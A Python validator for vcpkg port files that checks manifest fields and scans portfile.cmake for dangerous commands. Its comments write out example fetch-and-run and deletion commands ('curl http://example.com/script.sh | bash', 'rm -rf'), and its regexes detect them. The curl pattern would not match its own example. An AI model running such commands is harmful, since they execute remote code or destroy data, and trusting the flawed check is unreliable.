"""
vcpkg.json 和 portfile.cmake 验证器
功能：对 vcpkg 包管理器的关键配置文件进行规范性检查
设计目标：确保端口文件符合 vcpkg 社区标准，防止常见错误模式
"""

import json
import re
from typing import List

class FileValidator:
    """
    vcpkg 配置文件验证器类
    提供静态方法用于验证 vcpkg.json 和 portfile.cmake 文件的规范性
    """
    
    @staticmethod
    def validate_vcpkg_json(content: str) -> List[str]:
        """
        验证 vcpkg.json 清单文件的完整性和规范性
        
        Args:
            content (str): vcpkg.json 文件内容字符串
            
        Returns:
            List[str]: 错误信息列表，空列表表示验证通过
            
        验证规则：
        1. JSON 格式正确性检查
        2. 必需字段存在性检查
        3. 数据类型规范性检查
        """
        errors = []  # 存储验证错误信息
        
        try:
            # 第一步：JSON 语法解析检查
            # 确保文件是有效的 JSON 格式
            data = json.loads(content)
            
            # 第二步：必需字段检查
            # vcpkg.json 必须包含以下三个核心字段
            required_fields = ['name', 'version', 'description']
            for field in required_fields:
                if field not in data:
                    errors.append(f"Missing required field: {field}")
                    
            # 第三步：数据类型和结构验证
            # dependencies 字段必须是数组类型（如果存在）
            if 'dependencies' in data and not isinstance(data['dependencies'], list):
                errors.append("Dependencies must be an array")
                
            # 第四步：字段值格式验证（可扩展）
            if 'name' in data and not re.match(r'^[a-z0-9-]+$', data['name']):
                errors.append("Package name must contain only lowercase letters, numbers, and hyphens")
                
            if 'version' in data and not re.match(r'^\d+\.\d+\.\d+$', data['version']):
                errors.append("Version must be in semantic format (e.g., 1.0.0)")
                
        except json.JSONDecodeError as e:
            # JSON 解析失败，文件格式错误
            errors.append(f"Invalid JSON format: {str(e)}")
        except Exception as e:
            # 其他未预期错误
            errors.append(f"Unexpected error during validation: {str(e)}")
            
        return errors

    @staticmethod
    def validate_portfile(content: str) -> List[str]:
        """
        验证 portfile.cmake 构建脚本的规范性和安全性
        
        Args:
            content (str): portfile.cmake 文件内容字符串
            
        Returns:
            List[str]: 错误信息列表，空列表表示验证通过
            
        验证规则：
        1. 必需命令存在性检查
        2. 危险命令模式检测
        3. 最佳实践符合性检查
        """
        errors = []  # 存储验证错误信息
        
        # 第一步：必需命令检查
        # portfile.cmake 必须包含以下关键命令序列
        required_cmds = [
            r'vcpkg_from_(github|gitlab|bitbucket)',  # 源码获取命令
            r'vcpkg_(install_cmake|configure_cmake)'   # 构建安装命令
        ]
        
        for pattern in required_cmds:
            if not re.search(pattern, content):
                # 根据模式类型提供具体的错误提示
                if 'from_' in pattern:
                    errors.append("Missing source acquisition command (vcpkg_from_github/gitlab/bitbucket)")
                else:
                    errors.append("Missing build/install command (vcpkg_install_cmake/configure_cmake)")
        
        # 第二步：危险命令检测
        # 检测不安全的文件下载方式
        if 'file(DOWNLOAD' in content:
            errors.append(
                "Avoid using file(DOWNLOAD) which lacks proper error handling. "
                "Use vcpkg_download_distfile instead for better reliability and caching."
            )
        
        # 第三步：不安全操作检测
        # 检测可能引起安全问题的操作
        '''
        规则1：危险文件删除操作​ 
            execute_process\s*\( → 匹配 execute_process(可能有空格
            [^)]* → 匹配非右括号的任意字符（参数部分）
            COMMAND\s+ → 匹配 COMMAND 后跟空格
            [^)]*rm\s+-rf → 匹配包含 rm -rf 的命令

        如：execute_process(COMMAND rm -rf ${SOME_PATH})  # 可能删除关键目录

        规则2：不安全的 curl 管道操作​
            curl\s+ → 匹配 curl 后跟空格
            \| → 匹配管道符号 |
        
        如：execute_process(COMMAND curl http://example.com/script.sh | bash)  # 可能运行恶意脚本
        
        规则3：不安全的 wget 管道操作​
            wget\s+-O\s+.*\| → 匹配 wget -O 后跟空格和任意字符再跟管道符号 |
        
        如：execute_process(COMMAND wget -O - http://example.com/script.sh | sh)  # 同样危险
        '''
        dangerous_patterns = [
            (r'execute_process\s*\([^)]*COMMAND\s+[^)]*rm\s+-rf', "Dangerous file removal operation detected"),
            (r'curl\s+\|', "Unsafe pipe operation with curl detected"),
            (r'wget\s+-O\s+.*\|', "Unsafe pipe operation with wget detected")
        ]
        
        # 解包每个规则的正则模式和警告信息
        # 在文件内容中搜索危险模式，忽略大小写
        for pattern, message in dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                errors.append(message)
        
        # 第四步：最佳实践检查
        # 验证是否包含推荐的配置项
        if 'vcpkg_fixup_pkgconfig' not in content and 'pkg-config' in content.lower():
            errors.append("Consider using vcpkg_fixup_pkgconfig for pkg-config file handling")
        
        # 第五步：常见错误模式检查
        if 'vcpkg_install_cmake()' in content and 'vcpkg_cmake_configure' not in content:
            errors.append("vcpkg_install_cmake() should be preceded by vcpkg_cmake_configure()")
            
        return errors

    @staticmethod
    def validate_port_directory_structure(files: List[str]) -> List[str]:
        """
        验证端口目录结构的完整性（扩展功能）
        
        Args:
            files (List[str]): 端口目录下的文件列表
            
        Returns:
            List[str]: 结构完整性错误信息
        """
        errors = []
        required_files = ['vcpkg.json', 'portfile.cmake']
        
        for req_file in required_files:
            if req_file not in files:
                errors.append(f"Missing required file: {req_file}")
                
        # 检查是否有不必要的文件
        suspicious_files = ['configure', 'Makefile', 'install']
        for sus_file in suspicious_files:
            if sus_file in files:
                errors.append(f"Suspicious file found: {sus_file} - should be handled by vcpkg commands")
                
        return errors

# 使用示例和测试代码
if __name__ == "__main__":
    # 测试 vcpkg.json 验证
    test_json = """{
        "name": "example-package",
        "version": "1.0.0",
        "description": "An example package"
    }"""
    
    json_errors = FileValidator.validate_vcpkg_json(test_json)
    print("vcpkg.json 验证结果:", json_errors)
    
    # 测试 portfile.cmake 验证
    test_portfile = """
        vcpkg_from_github(
            OUT_SOURCE_PATH SOURCE_PATH
            REPO example/example
            REF v1.0.0
        )
        vcpkg_configure_cmake(SOURCE_PATH ${SOURCE_PATH})
        vcpkg_install_cmake()
    """
    
    portfile_errors = FileValidator.validate_portfile(test_portfile)
    print("portfile.cmake 验证结果:", portfile_errors)